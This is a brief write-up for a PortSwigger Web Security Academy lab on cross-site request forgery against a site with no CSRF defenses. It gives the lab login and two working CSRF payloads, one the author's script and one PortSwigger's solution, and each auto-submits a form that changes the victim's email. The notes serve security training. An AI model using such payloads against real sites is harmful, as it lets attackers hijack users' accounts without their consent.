# [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

- log in with `wiener:peter`
- can change the email address
- there is no `csrf` key just a simple exploit is enough

> in the exploit server deliver this to the victim

```
<body>
  <script>
    const form = document.createElement("form");
    const email = document.createElement("input");
    email.name = "email";
    email.value = "duck@quack";
    form.method = "post";
    form.action =
      "https://xxx.web-security-academy.net/my-account/change-email";
    form.append(email);
    document.body.append(form);
    form.submit();
  </script>
</body>
```

> portswigger solution:

```
<form method="POST" action="https://xxx.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="duck@quack" />
</form>
<script>
  document.forms[0].submit();
</script>
```
